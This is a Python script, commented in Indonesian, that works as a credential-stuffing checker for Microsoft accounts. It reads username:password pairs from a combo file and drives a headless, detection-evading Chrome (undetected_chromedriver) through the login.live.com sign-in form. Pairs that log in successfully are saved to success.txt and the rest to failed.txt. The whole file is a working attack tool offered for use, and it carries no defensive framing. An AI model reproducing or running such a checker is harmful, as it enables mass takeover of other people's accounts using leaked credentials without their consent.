import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import time

def check_account(username, password):
    try:
        # Konfigurasi driver
        options = uc.ChromeOptions()
        options.add_argument("--headless")  # Jalankan tanpa GUI
        driver = uc.Chrome(options=options)

        driver.get("https://login.live.com/")

        # Input username
        username_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "i0116"))
        )
        username_field.send_keys(username)

        next_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "idSIButton9"))
        )
        next_button.click()

        # Input password
        password_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "i0118"))
        )
        password_field.send_keys(password)

        signin_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "idSIButton9"))
        )
        signin_button.click()

        # Cek apakah login berhasil
        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "meControl"))
            )
            print(f"Login berhasil untuk {username}")
            driver.quit()
            return True
        except TimeoutException:
            print(f"Login gagal untuk {username}")
            driver.quit()
            return False

    except Exception as e:
        print(f"Terjadi kesalahan: {str(e)}")
        if 'driver' in locals():
            driver.quit()
        return False

def main():
    success_file = "success.txt"
    failed_file = "failed.txt"
    combo_file = "combo.txt"

    with open(combo_file, "r") as f:
        for line in f:
            username, password = line.strip().split(":")
            if check_account(username, password):
                with open(success_file, "a") as sf:
                    sf.write(f"{username}:{password}\n")
            else:
                with open(failed_file, "a") as ff:
                    ff.write(f"{username}:{password}\n")

if __name__ == "__main__":
    main()